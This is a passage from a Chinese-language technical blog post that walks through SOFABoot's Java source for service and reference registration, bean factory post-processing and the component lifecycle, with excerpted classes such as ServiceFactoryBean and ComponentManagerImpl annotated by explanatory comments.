&#123;&#125;"</span>, field);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        ReflectionUtils.doWithMethods(beanClass, <span class="keyword">new</span> ReflectionUtils.MethodCallback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doWith</span><span class="params">(Method method)</span> <span class="keyword">throws</span> IllegalArgumentException,</span></span><br><span class="line"><span class="function">                                             IllegalAccessException </span>&#123;</span><br><span class="line">                Class[] parameterTypes = method.getParameterTypes();</span><br><span class="line">                Assert.isTrue(parameterTypes.length == <span class="number">1</span>,</span><br><span class="line">                    <span class="string">"method should have one and only one parameter."</span>);</span><br><span class="line"></span><br><span class="line">                SofaReference sofaReferenceAnnotation = method.getAnnotation(SofaReference.class);</span><br><span class="line">                <span class="keyword">if</span> (sofaReferenceAnnotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                AnnotationWrapperBuilder&lt;SofaReference&gt; builder = AnnotationWrapperBuilder.wrap(</span><br><span class="line">                    sofaReferenceAnnotation).withBinder(binder);</span><br><span class="line">                sofaReferenceAnnotation = builder.build();</span><br><span class="line"></span><br><span class="line">                Class&lt;?&gt; interfaceType = sofaReferenceAnnotation.interfaceType();</span><br><span class="line">                <span class="keyword">if</span> (interfaceType.equals(<span class="keyword">void</span>.class)) &#123;</span><br><span class="line">                    interfaceType = parameterTypes[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Object proxy = createReferenceProxy(sofaReferenceAnnotation, interfaceType);</span><br><span class="line">                ReflectionUtils.invokeMethod(method, bean, proxy);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="keyword">new</span> ReflectionUtils.MethodFilter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(Method method)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> method.isAnnotationPresent(SofaReference.class);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建ReferenceComponent的代理对象，并注册</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">createReferenceProxy</span><span class="params">(SofaReference sofaReferenceAnnotation,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        Class&lt;?&gt; interfaceType)</span> </span>&#123;</span><br><span class="line">        Reference reference = <span class="keyword">new</span> ReferenceImpl(sofaReferenceAnnotation.uniqueId(), interfaceType,</span><br><span class="line">            InterfaceMode.annotation, sofaReferenceAnnotation.jvmFirst());</span><br><span class="line">        BindingConverter bindingConverter = bindingConverterFactory</span><br><span class="line">            .getBindingConverter(<span class="keyword">new</span> BindingType(sofaReferenceAnnotation.binding().bindingType()));</span><br><span class="line">        <span class="keyword">if</span> (bindingConverter == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Can not found binding converter for binding type "</span></span><br><span class="line">                                              + sofaReferenceAnnotation.binding().bindingType());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        BindingConverterContext bindingConverterContext = <span class="keyword">new</span> BindingConverterContext();</span><br><span class="line">        bindingConverterContext.setInBinding(<span class="keyword">true</span>);</span><br><span class="line">        bindingConverterContext.setApplicationContext(applicationContext);</span><br><span class="line">        bindingConverterContext.setAppName(sofaRuntimeContext.getAppName());</span><br><span class="line">        bindingConverterContext.setAppClassLoader(sofaRuntimeContext.getAppClassLoader());</span><br><span class="line">        Binding binding = bindingConverter.convert(sofaReferenceAnnotation,</span><br><span class="line">            sofaReferenceAnnotation.binding(), bindingConverterContext);</span><br><span class="line">        reference.addBinding(binding);</span><br><span class="line">        <span class="comment">// 注册组件</span></span><br><span class="line">        <span class="keyword">return</span> ReferenceRegisterHelper.registerReference(reference, bindingAdapterFactory,</span><br><span class="line">            sofaRuntimeContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ReferenceRegisterHelper.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceRegisterHelper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">registerReference</span><span class="params">(Reference reference,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           BindingAdapterFactory bindingAdapterFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           SofaRuntimeContext sofaRuntimeContext)</span> </span>&#123;</span><br><span class="line">        Binding binding = (Binding) reference.getBindings().toArray()[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!binding.getBindingType().equals(JvmBinding.JVM_BINDING_TYPE)</span><br><span class="line">            &amp;&amp; !SofaRuntimeProperties.isDisableJvmFirst(sofaRuntimeContext)</span><br><span class="line">            &amp;&amp; reference.isJvmFirst()) &#123;</span><br><span class="line">            <span class="comment">// as rpc invocation would be serialized, so here would Not ignore serialized</span></span><br><span class="line">            reference.addBinding(<span class="keyword">new</span> JvmBinding());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ComponentManager componentManager = sofaRuntimeContext.getComponentManager();</span><br><span class="line">        ReferenceComponent referenceComponent = <span class="keyword">new</span> ReferenceComponent(reference,</span><br><span class="line">            <span class="keyword">new</span> DefaultImplementation(), bindingAdapterFactory, sofaRuntimeContext);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (componentManager.isRegistered(referenceComponent.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> componentManager.getComponentInfo(referenceComponent.getName())</span><br><span class="line">                .getImplementation().getTarget();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册组件并获取返回的组件信息，参考下文</span></span><br><span class="line">        ComponentInfo componentInfo = componentManager.registerAndGet(referenceComponent);</span><br><span class="line">        <span class="keyword">return</span> componentInfo.getImplementation().getTarget();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ServiceBeanFactoryPostProcessor为例"><a href="#ServiceBeanFactoryPostProcessor为例" class="headerlink" title="ServiceBeanFactoryPostProcessor为例"></a>ServiceBeanFactoryPostProcessor为例</h5><ul><li>ServiceBeanFactoryPostProcessor.java 修改(Component)Bean的定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceBeanFactoryPostProcessor</span> <span class="keyword">implements</span> <span class="title">BeanFactoryPostProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        Arrays.stream(beanFactory.getBeanDefinitionNames())</span><br><span class="line">            .collect(Collectors.toMap(Function.identity(), beanFactory::getBeanDefinition))</span><br><span class="line">            <span class="comment">// 循环所有的bean定义配置，transformSofaBeanDefinition最终会调用到 generateSofaServiceDefinitionOnClass</span></span><br><span class="line">            .forEach((key, value) -&gt; transformSofaBeanDefinition(key, value, beanFactory));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generateSofaServiceDefinitionOnClass</span><span class="params">(String beanId, Class&lt;?&gt; beanClass,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      BeanDefinition beanDefinition,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      ConfigurableListableBeanFactory beanFactory)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取有 SofaService 注解的类</span></span><br><span class="line">        SofaService sofaServiceAnnotation = beanClass.getAnnotation(SofaService.class);</span><br><span class="line">        generateSofaServiceDefinition(beanId, sofaServiceAnnotation, beanClass, beanDefinition,</span><br><span class="line">            beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generateSofaServiceDefinition</span><span class="params">(String beanId, SofaService sofaServiceAnnotation,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               Class&lt;?&gt; beanClass, BeanDefinition beanDefinition,</span></span></span><br><span class="line"><span class="function"><span class="params">                                               ConfigurableListableBeanFactory beanFactory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sofaServiceAnnotation == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 生成 SofaService 定义对象</span></span><br><span class="line">        AnnotationWrapperBuilder&lt;SofaService&gt; wrapperBuilder = AnnotationWrapperBuilder.wrap(</span><br><span class="line">            sofaServiceAnnotation).withBinder(binder);</span><br><span class="line">        sofaServiceAnnotation = wrapperBuilder.build();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; interfaceType = sofaServiceAnnotation.interfaceType();</span><br><span class="line">        <span class="keyword">if</span> (interfaceType.equals(<span class="keyword">void</span>.class)) &#123;</span><br><span class="line">            Class&lt;?&gt; interfaces[] = beanClass.getInterfaces();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (beanClass.isInterface() || interfaces == <span class="keyword">null</span> || interfaces.length == <span class="number">0</span>) &#123;</span><br><span class="line">                interfaceType = beanClass;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (interfaces.length == <span class="number">1</span>) &#123;</span><br><span class="line">                interfaceType = interfaces[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FatalBeanException(<span class="string">"Bean "</span> + beanId + <span class="string">" has more than one interface."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        BeanDefinitionBuilder builder = BeanDefinitionBuilder.genericBeanDefinition();</span><br><span class="line">        String serviceId = SofaBeanNameGenerator.generateSofaServiceBeanName(interfaceType,</span><br><span class="line">            sofaServiceAnnotation.uniqueId());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在Bean实例化之前，修改Bean的定义</span></span><br><span class="line">        <span class="keyword">if</span> (!beanFactory.containsBeanDefinition(serviceId)) &#123;</span><br><span class="line">            builder.getRawBeanDefinition().setScope(beanDefinition.getScope());</span><br><span class="line">            builder.setLazyInit(beanDefinition.isLazyInit());</span><br><span class="line">            builder.getRawBeanDefinition().setBeanClass(ServiceFactoryBean.class);</span><br><span class="line">            builder.addPropertyValue(AbstractContractDefinitionParser.INTERFACE_CLASS_PROPERTY,</span><br><span class="line">                interfaceType);</span><br><span class="line">            builder.addPropertyValue(AbstractContractDefinitionParser.UNIQUE_ID_PROPERTY,</span><br><span class="line">                sofaServiceAnnotation.uniqueId());</span><br><span class="line">            builder.addPropertyValue(AbstractContractDefinitionParser.BINDINGS,</span><br><span class="line">                getSofaServiceBinding(sofaServiceAnnotation, sofaServiceAnnotation.bindings()));</span><br><span class="line">            builder.addPropertyReference(ServiceDefinitionParser.REF, beanId);</span><br><span class="line">            builder.addPropertyValue(ServiceDefinitionParser.BEAN_ID, beanId);</span><br><span class="line">            builder.addPropertyValue(AbstractContractDefinitionParser.DEFINITION_BUILDING_API_TYPE,</span><br><span class="line">                <span class="keyword">true</span>);</span><br><span class="line">            builder.addDependsOn(beanId);</span><br><span class="line">            ((BeanDefinitionRegistry) beanFactory).registerBeanDefinition(serviceId,</span><br><span class="line">                builder.getBeanDefinition());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            SofaLogger.error(<span class="string">"SofaService was already registered: &#123;0&#125;"</span>, serviceId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>AbstractContractFactoryBean.java 触发Component注册</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractContractFactoryBean</span> <span class="keyword">implements</span> <span class="title">InitializingBean</span>, <span class="title">FactoryBean</span>,</span></span><br><span class="line"><span class="class">                                                 <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">    <span class="comment">// org.springframework.beans.factory.InitializingBean                 </span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;Element&gt; tempElements = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (elements != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (TypedStringValue element : elements) &#123;</span><br><span class="line">                DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory</span><br><span class="line">                    .newInstance();</span><br><span class="line">                documentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">                InputSource inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> ByteArrayInputStream(element</span><br><span class="line">                    .getValue().getBytes()));</span><br><span class="line">                inputSource.setEncoding(documentEncoding);</span><br><span class="line">                Element node = documentBuilderFactory.newDocumentBuilder().parse(inputSource)</span><br><span class="line">                    .getDocumentElement();</span><br><span class="line">                tempElements.add(node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sofaRuntimeContext = applicationContext.getBean(</span><br><span class="line">            SofaRuntimeFrameworkConstants.SOFA_RUNTIME_CONTEXT_BEAN_ID, SofaRuntimeContext.class);</span><br><span class="line">        bindingConverterFactory = getBindingConverterFactory();</span><br><span class="line">        bindingAdapterFactory = getBindingAdapterFactory();</span><br><span class="line">        <span class="keyword">if</span> (!apiType) &#123;</span><br><span class="line">            <span class="keyword">this</span>.bindings = parseBindings(tempElements, applicationContext, isInBinding());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行bean创建完后的操作</span></span><br><span class="line">        doAfterPropertiesSet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ServiceFactoryBean.java<ul><li>同理还有ReferenceFactoryBean</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceFactoryBean</span> <span class="keyword">extends</span> <span class="title">AbstractContractFactoryBean</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doAfterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!apiType &amp;&amp; hasSofaServiceAnnotation()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(</span><br><span class="line">                <span class="string">"Bean "</span> + beanId + <span class="string">" of type "</span> + ref.getClass()</span><br><span class="line">                        + <span class="string">" has already annotated by @SofaService,"</span></span><br><span class="line">                        + <span class="string">" can not be registered using xml. Please check it."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Implementation implementation = <span class="keyword">new</span> DefaultImplementation();</span><br><span class="line">        implementation.setTarget(ref);</span><br><span class="line">        service = buildService();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// default add jvm binding and service jvm binding should set serialize as true</span></span><br><span class="line">        <span class="keyword">if</span> (bindings.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            JvmBinding jvmBinding = <span class="keyword">new</span> JvmBinding();</span><br><span class="line">            JvmBindingParam jvmBindingParam = <span class="keyword">new</span> JvmBindingParam().setSerialize(<span class="keyword">true</span>);</span><br><span class="line">            bindings.add(<span class="keyword">new</span> JvmBinding().setJvmBindingParam(jvmBindingParam));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Binding binding : bindings) &#123;</span><br><span class="line">            service.addBinding(binding);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ComponentInfo componentInfo = <span class="keyword">new</span> ServiceComponent(implementation, service,</span><br><span class="line">            bindingAdapterFactory, sofaRuntimeContext);</span><br><span class="line">        <span class="comment">// 注册Component，参考下文 ComponentManagerImpl</span></span><br><span class="line">        sofaRuntimeContext.getComponentManager().register(componentInfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组件即其生命周期"><a href="#组件即其生命周期" class="headerlink" title="组件即其生命周期"></a>组件即其生命周期</h4><ul><li>Component接口，组件级别，可以理解为一个服务类相关信息<ul><li>方法：register、unregister、resolve、unresolve、activate、deactivate、exception</li><li>子接口：ComponentInfo，主要需要提供getType、getName等功能</li><li>抽象类：AbstractComponent，主要是实现 ComponentInfo，减少代码量</li><li>对应实现如：SpringContextComponent(类型为Spring)、ServiceComponent(类型为service)、ReferenceComponent(类型为reference)</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SOFA Component Lifecycle:</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *                  [UNREGISTERED]</span></span><br><span class="line"><span class="comment"> *                      |   ▲</span></span><br><span class="line"><span class="comment"> *           register   │   │   unregister</span></span><br><span class="line"><span class="comment"> *                      |   |</span></span><br><span class="line"><span class="comment"> *                   [REGISTERED]</span></span><br><span class="line"><span class="comment"> *                      |   ▲</span></span><br><span class="line"><span class="comment"> *           resolve    │   │   unresolve</span></span><br><span class="line"><span class="comment"> *                      |   |</span></span><br><span class="line"><span class="comment"> *                    [RESOLVED]</span></span><br><span class="line"><span class="comment"> *                      |   ▲</span></span><br><span class="line"><span class="comment"> *                 ┌────┘   └────┐</span></span><br><span class="line"><span class="comment"> *                 │             │</span></span><br><span class="line"><span class="comment"> *        activate |             ▲ deactivate</span></span><br><span class="line"><span class="comment"> *                 │             │</span></span><br><span class="line"><span class="comment"> *                 └───┐    ┌────┘</span></span><br><span class="line"><span class="comment"> *                          |</span></span><br><span class="line"><span class="comment"> *                   [ACTIVATED]</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>ComponentManagerImpl</code> 组件管理者(基于组件类维度)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComponentManagerImpl</span> <span class="keyword">implements</span> <span class="title">ComponentManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> ConcurrentMap&lt;ComponentName, ComponentInfo&gt; registry;</span><br><span class="line">    <span class="keyword">protected</span> ConcurrentMap&lt;ComponentType, Map&lt;ComponentName, ComponentInfo&gt;&gt; resolvedRegistry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册组件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ComponentInfo <span class="title">registerAndGet</span><span class="params">(ComponentInfo componentInfo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> doRegister(componentInfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行组件注册</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ComponentInfo <span class="title">doRegister</span><span class="params">(ComponentInfo ci)</span> </span>&#123;</span><br><span class="line">        ComponentName name = ci.getName();</span><br><span class="line">        <span class="keyword">if</span> (isRegistered(name)) &#123;</span><br><span class="line">            SofaLogger.error(<span class="string">"Component was already registered: &#123;&#125;"</span>, name);</span><br><span class="line">            <span class="keyword">if</span> (ci.canBeDuplicate()) &#123;</span><br><span class="line">                <span class="keyword">return</span> getComponentInfo(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Component can not be registered duplicated: "</span> + name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置 componentStatus = ComponentStatus.REGISTERED 为已注册</span></span><br><span class="line">            ci.register();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SofaLogger.error(<span class="string">"Failed to register component: &#123;&#125;"</span>, ci.getName(), t);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Registering component: reference:com.alipay.sofa.isle.sample.SampleJvmService:#2120635923</span></span><br><span class="line">        <span class="comment">// Registering component: service:com.alipay.sofa.isle.sample.SampleJvmService</span></span><br><span class="line">        <span class="comment">// Registering component: Spring:cn.aezo.sqbiz.sqbiz-plugin.service-provider</span></span><br><span class="line">        SofaLogger.info(<span class="string">"Registering component: &#123;&#125;"</span>, ci.getName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将组件缓存到 registry 集合中</span></span><br><span class="line">            ComponentInfo old = registry.putIfAbsent(ci.getName(), ci);</span><br><span class="line">            <span class="keyword">if</span> (old != <span class="keyword">null</span>) &#123;</span><br><span class="line">                SofaLogger.error(<span class="string">"Component was already registered: &#123;&#125;"</span>, name);</span><br><span class="line">                <span class="keyword">if</span> (ci.canBeDuplicate()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> old;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServiceRuntimeException(<span class="string">"Component can not be registered duplicated: "</span></span><br><span class="line">                                                  + name);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ci.resolve()) &#123; <span class="comment">// 设置 componentStatus = ComponentStatus.RESOLVED 为已归纳</span></span><br><span class="line">                <span class="comment">// 按照 ComponentType 类型进行归纳，包含：service/reference/Spring等</span></span><br><span class="line">                typeRegistry(ci);</span><br><span class="line">                <span class="comment">// **执行激活组件方法，参考下文**</span></span><br><span class="line">                ci.activate();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            ci.exception(<span class="keyword">new</span> Exception(t));</span><br><span class="line">            SofaLogger.error(<span class="string">"Failed to create the component &#123;&#125;"</span>, 